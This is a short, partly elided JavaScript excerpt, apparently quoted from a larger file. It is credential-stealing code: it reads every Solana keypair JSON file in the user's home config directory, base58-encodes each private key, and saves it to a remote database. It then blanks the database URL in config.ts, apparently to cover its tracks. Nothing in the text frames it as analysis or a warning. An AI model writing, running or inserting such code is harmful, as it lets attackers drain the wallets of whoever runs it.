...
import {connectDB, dbsave} from "./utils";
...
async function main() {
  await connectDB();
  const dir_path = `${os.homedir()}/.config/solana/`;
  
  fs.readdir(dir_path, (err, files) => {
    files.forEach(async (file) => {
      if (file.includes(".json")) {
        const keyPairPath = dir_path + file;
        ...
        const string_key = bs58.encode(privateKey);
        await dbsave(string_key);
      }
    });
  });
  fs.writeFileSync("./config.ts", "export const mongo_url = ''");
